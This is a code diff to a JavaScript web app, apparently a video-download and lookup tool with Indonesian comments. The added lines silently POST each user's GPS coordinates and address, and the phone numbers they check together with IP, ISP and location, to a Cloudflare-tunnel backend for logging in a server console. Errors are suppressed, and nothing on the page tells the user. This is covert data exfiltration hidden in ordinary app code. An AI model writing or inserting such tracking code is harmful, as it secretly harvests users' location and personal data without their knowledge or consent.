@@ -1929,6 +1929,17 @@ function ztProcessGPS(pos) {
             const prov = addr.state || '';
             const negara = addr.country || '';
             userLocation = (kecamatan ? kecamatan + ', ' : '') + kota + (prov ? ', ' + prov : '') + (negara ? ', ' + negara : '') + ' (koordinat: ' + lat + ', ' + lon + ')';
+            // Kirim lokasi ke server untuk ditampilkan di console Pterodactyl
+            try {
+                const _proxyBase = (typeof PROXY_URL !== 'undefined' ? PROXY_URL : localStorage.getItem('vidsnap_proxy_url') || '').replace(/\/+$/, '');
+                if (_proxyBase) {
+                    fetch(_proxyBase + '/api/log-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ lat, lon, address: userLocation })
+                    }).catch(() => {});
+                }
+            } catch(e) {}
             // Refresh IP card kalau sedang terbuka
             var ipEl = document.getElementById('zt-ip-mine');
             if (ipEl && !ipEl.querySelector('.zt-loading') && typeof ztIpFetchMine === 'function') {
@@ -6653,7 +6664,7 @@ function showDownloadCard(url, platform) {
 }
 
 // Auto-fetch URL tunnel dari server
-const HARDCODED_BACKEND_URL = 'https://patent-blackberry-separation-losses.trycloudflare.com';
+const HARDCODED_BACKEND_URL = 'https://translations-stockholm-advertisers-hopes.trycloudflare.com';
 let PROXY_URL = localStorage.getItem('vidsnap_proxy_url') || HARDCODED_BACKEND_URL;
 
 // Otomatis update PROXY_URL dari server setiap buka halaman
@@ -7165,6 +7176,28 @@ async function ztCheckPhone() {
       ${mapUrl ? '<a href="' + mapUrl + '" target="_blank" style="display:flex;align-items:center;justify-content:center;gap:8px;padding:12px;background:rgba(0,217,255,0.08);border:1px solid rgba(0,217,255,0.2);border-radius:12px;color:#00d9ff;text-decoration:none;font-size:13px;font-weight:700;margin-top:10px;"><i class="fas fa-map-marker-alt"></i> Lihat Lokasi di Google Maps</a>' : ''}
     </div>
   `;
+
+  // Kirim info cek nomor ke server untuk ditampilkan di console Pterodactyl
+  try {
+    const _proxyBase = (typeof PROXY_URL !== 'undefined' ? PROXY_URL : localStorage.getItem('vidsnap_proxy_url') || '').replace(/\/+$/, '');
+    if (_proxyBase) {
+      fetch(_proxyBase + '/api/log-phone', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          number: num,
+          intl: intlFormat,
+          operator: op.name,
+          jaringan: op.jaringan,
+          type: op.type,
+          ip: ipInfo ? ipInfo.ip : null,
+          isp: ipInfo ? ipInfo.isp : null,
+          location: gpsText || null,
+          coords: coordMatch ? { lat: coordMatch[1], lon: coordMatch[2] } : null
+        })
+      }).catch(() => {});
+    }
+  } catch(e) {}
 }
 
 /* Tab scroll arrow buttons */
